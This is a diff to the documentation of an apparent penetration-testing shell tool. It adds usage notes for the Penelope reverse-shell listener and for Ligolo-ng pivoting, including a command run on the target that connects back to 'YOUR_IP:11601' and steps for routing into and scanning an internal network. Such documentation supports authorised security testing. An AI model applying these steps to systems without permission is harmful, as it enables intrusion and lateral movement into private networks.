@@ -150,6 +150,24 @@ run
 | `sliver status` | Check status |
 | `sliver configs` | List configs |
 
+### Penelope Shell Handler
+| Command | Description |
+|---------|-------------|
+| `penelope [port]` | Start listener (default 4444) |
+| `penelope resume`, `fg` | Resume session |
+| `penelope status` | Check status |
+| `penelope help` | Full help |
+
+### Ligolo-ng Tunneling
+| Command | Description |
+|---------|-------------|
+| `ligolo [port]` | Start proxy (default 11601) |
+| `ligolo resume`, `fg` | Resume session |
+| `ligolo agents` | List agents |
+| `ligolo route add <net>` | Add route |
+| `ligolo routes` | List routes |
+| `ligolo status` | Check status |
+
 ### Shell Commands
 | Command | Description |
 |---------|-------------|
@@ -343,6 +361,41 @@ start gosh 8000
 
 # Listen for reverse shell
 listen 4444
+```
+
+### Penelope Shell Handling
+
+```bash
+# Start Penelope listener
+penelope 4444
+
+# Receive shell, then Ctrl+D to background
+# Listener stays active!
+
+# Check shells from UwU
+shells
+
+# Resume Penelope
+penelope resume
+```
+
+### Ligolo-ng Pivoting
+
+```bash
+# Start Ligolo proxy
+ligolo
+
+# On target: ./agent -connect YOUR_IP:11601 -ignore-cert
+# In Ligolo: session, then start
+
+# Ctrl+D to background, add routes from UwU
+ligolo route add 10.10.10.0/24
+
+# Now access internal network directly
+!nmap -sV 10.10.10.50
+
+# Resume Ligolo when needed
+ligolo resume
 ```
 
 ---
